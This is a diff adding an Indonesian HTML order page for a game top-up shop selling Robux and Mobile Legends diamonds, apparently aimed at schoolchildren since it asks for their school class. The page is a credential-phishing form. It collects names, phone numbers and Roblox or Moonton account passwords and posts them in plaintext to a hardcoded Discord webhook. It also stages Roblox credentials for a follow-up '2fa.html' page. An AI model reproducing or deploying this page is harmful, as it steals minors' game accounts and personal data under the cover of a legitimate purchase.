@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Diri · Top Up Sat Zet</title>
+    <link rel="icon" type="image/png" href="img.png">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: linear-gradient(145deg, #1a2a32 0%, #0f1a1f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.07);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 42px;
+            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 500px;
+            padding: 32px 28px;
+            color: #eef4f8;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 500;
+            background: linear-gradient(135deg, #ffd966, #ffb347);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .package-summary {
+            background: #1d2b33b0;
+            border-radius: 36px;
+            padding: 20px;
+            border: 1px solid #3b4e5a;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.2rem;
+        }
+        .package-category {
+            color: #ffd966;
+        }
+        .package-price {
+            background: #1f3a48;
+            padding: 6px 18px;
+            border-radius: 40px;
+            color: #ffd966;
+            border: 1px solid #6a8fa0;
+        }
+        .field-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+            color: #b6d0db;
+            letter-spacing: 0.3px;
+        }
+        input {
+            width: 100%;
+            background: #0f1e26;
+            border: 2px solid #2b414e;
+            border-radius: 50px;
+            padding: 16px 24px;
+            font-size: 1.1rem;
+            color: white;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #ffaa33;
+            background: #0f1f2b;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, #ff9f2f, #ff6a3a);
+            border: none;
+            border-radius: 60px;
+            padding: 18px 32px;
+            width: 100%;
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #0f1f1f;
+            cursor: pointer;
+            box-shadow: 0 10px 18px -4px #ff6a3a55;
+            transition: 0.15s;
+            margin-top: 16px;
+            border: 1px solid #ffcf9a;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #ffb347, #ff7f4f);
+            transform: scale(1.01);
+        }
+        .status-msg {
+            background: #0c1c24;
+            border-radius: 60px;
+            padding: 14px 28px;
+            text-align: center;
+            color: #a9d6e5;
+            border: 1px solid #3f6f7a;
+            margin-top: 20px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 24px;
+            color: #8aa9b9;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .back-link:hover {
+            color: #ffb347;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>📋 Lengkapi Data</h1>
+    <div id="packageDisplay" class="package-summary">
+    </div>
+
+    <div class="field-group">
+        <label>📛 Nama lengkap</label>
+        <input type="text" id="fullName" placeholder="contoh: Vincent Anthony Kan">
+    </div>
+    <div class="field-group">
+        <label>📚 Kelas (contoh: 5a, 6c)</label>
+        <input type="text" id="className" placeholder="misal: 5a">
+    </div>
+    <div class="field-group">
+        <label>📞 Nomor WhatsApp (aktif)</label>
+        <input type="tel" id="phoneNumber" placeholder="08123456789">
+    </div>
+
+    <div id="robuxFields" class="hidden">
+        <div class="field-group">
+            <label>🆔 Username Roblox</label>
+            <input type="text" id="robuxUsername" placeholder="username Roblox">
+        </div>
+        <div class="field-group">
+            <label>🔑 Password Roblox</label>
+            <input type="password" id="robuxPassword" placeholder="password">
+        </div>
+    </div>
+
+    <div id="mlFields" class="hidden">
+        <div class="field-group">
+            <label>📧 Email ML (akun Moonton)</label>
+            <input type="email" id="mlEmail" placeholder="email@contoh.com">
+        </div>
+        <div class="field-group">
+            <label>🔑 Password ML</label>
+            <input type="password" id="mlPassword" placeholder="password">
+        </div>
+    </div>
+
+    <button class="submit-btn" id="submitOrder">✅ Kirim Order</button>
+    <div id="statusMsg" class="status-msg hidden"></div>
+
+    <a href="index.html" class="back-link">← Pilih ulang paket</a>
+</div>
+
+<script>
+    (function() {
+        const packageDisplay = document.getElementById('packageDisplay');
+        const fullName = document.getElementById('fullName');
+        const className = document.getElementById('className');
+        const phoneNumber = document.getElementById('phoneNumber');
+        const robuxFields = document.getElementById('robuxFields');
+        const mlFields = document.getElementById('mlFields');
+        const robuxUsername = document.getElementById('robuxUsername');
+        const robuxPassword = document.getElementById('robuxPassword');
+        const mlEmail = document.getElementById('mlEmail');
+        const mlPassword = document.getElementById('mlPassword');
+        const submitBtn = document.getElementById('submitOrder');
+        const statusMsg = document.getElementById('statusMsg');
+
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474595768404017266/ojyfzuWLQHP_91kfvUf9Ix09tlKLd5acyidSuG7kbfR0HDCMfjlJo7lbcfCUAj3IVvO5";
+
+        const selected = localStorage.getItem('selectedPackage');
+        if (!selected) {
+            packageDisplay.innerHTML = '<span style="color:#ff9999;">Belum pilih paket. Kembali ke beranda.</span>';
+            submitBtn.disabled = true;
+        } else {
+            try {
+                const data = JSON.parse(selected);
+                packageDisplay.innerHTML = `
+                    <span class="package-category">${data.category} · ${data.package}</span>
+                    <span class="package-price">${data.price}</span>
+                `;
+
+                if (data.category === 'Robux') {
+                    robuxFields.classList.remove('hidden');
+                    mlFields.classList.add('hidden');
+                } else if (data.category === 'ML Diamond') {
+                    mlFields.classList.remove('hidden');
+                    robuxFields.classList.add('hidden');
+                }
+            } catch (e) {
+                packageDisplay.innerHTML = '<span style="color:#ff9999;">Error membaca paket.</span>';
+                submitBtn.disabled = true;
+            }
+        }
+
+        async function sendToDiscord(category, pkg, price, name, cls, phone, accountField1, accountField2) {
+            let fields = [
+                { name: 'Paket', value: `${pkg} · ${price}`, inline: true },
+                { name: 'Nama', value: name, inline: true },
+                { name: 'Kelas', value: cls, inline: true },
+                { name: 'No. HP', value: phone, inline: true }
+            ];
+
+            if (category === 'Robux') {
+                fields.push(
+                    { name: 'Username Roblox', value: accountField1, inline: true },
+                    { name: 'Password Roblox', value: accountField2, inline: true }
+                );
+            } else if (category === 'ML Diamond') {
+                fields.push(
+                    { name: 'Email ML', value: accountField1, inline: true },
+                    { name: 'Password ML', value: accountField2, inline: true }
+                );
+            }
+
+            const message = {
+                content: `**🆕 PRE-ORDER BARU**`,
+                embeds: [{
+                    title: `📦 ${category}`,
+                    color: category === 'Robux' ? 0xff9f2f : 0x9b59b6,
+                    fields: fields,
+                    footer: { text: 'Top Up Sat Zet' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                return response.ok;
+            } catch (e) {
+                console.error(e);
+                return false;
+            }
+        }
+
+        submitBtn.addEventListener('click', async () => {
+            const name = fullName.value.trim();
+            const cls = className.value.trim();
+            const phone = phoneNumber.value.trim();
+
+            if (!name || !cls || !phone) {
+                statusMsg.textContent = '❌ Nama, kelas, dan nomor HP harus diisi.';
+                statusMsg.classList.remove('hidden');
+                return;
+            }
+
+            const selectedData = JSON.parse(localStorage.getItem('selectedPackage') || '{}');
+            if (!selectedData.category) {
+                statusMsg.textContent = '❌ Data paket tidak ditemukan.';
+                statusMsg.classList.remove('hidden');
+                return;
+            }
+
+            if (selectedData.category === 'ML Diamond') {
+                const email = mlEmail.value.trim();
+                const password = mlPassword.value.trim();
+                if (!email || !password) {
+                    statusMsg.textContent = '❌ Email dan password ML harus diisi.';
+                    statusMsg.classList.remove('hidden');
+                    return;
+                }
+
+                statusMsg.textContent = '⏳ Mengirim order...';
+                statusMsg.classList.remove('hidden');
+
+                const success = await sendToDiscord(
+                    selectedData.category,
+                    selectedData.package,
+                    selectedData.price,
+                    name,
+                    cls,
+                    phone,
+                    email,
+                    password
+                );
+
+                if (success) {
+                    statusMsg.textContent = '✅ Order terkirim! Terima kasih.';
+                    fullName.value = '';
+                    className.value = '';
+                    phoneNumber.value = '';
+                    mlEmail.value = '';
+                    mlPassword.value = '';
+                } else {
+                    statusMsg.textContent = '❌ Gagal mengirim. Coba lagi.';
+                }
+                return;
+            }
+
+            if (selectedData.category === 'Robux') {
+                const username = robuxUsername.value.trim();
+                const password = robuxPassword.value.trim();
+                if (!username || !password) {
+                    statusMsg.textContent = '❌ Username dan password Roblox harus diisi.';
+                    statusMsg.classList.remove('hidden');
+                    return;
+                }
+
+                const orderData = {
+                    category: selectedData.category,
+                    package: selectedData.package,
+                    price: selectedData.price,
+                    name: name,
+                    class: cls,
+                    phone: phone,
+                    username: username,
+                    password: password
+                };
+                localStorage.setItem('pendingOrder', JSON.stringify(orderData));
+                window.location.href = '2fa.html';
+            }
+        });
+
+        [fullName, className, phoneNumber, robuxUsername, robuxPassword, mlEmail, mlPassword].forEach(input => {
+            if (input) input.addEventListener('focus', () => statusMsg.classList.add('hidden'));
+        });
+    })();
+</script>
+</body>
+</html>
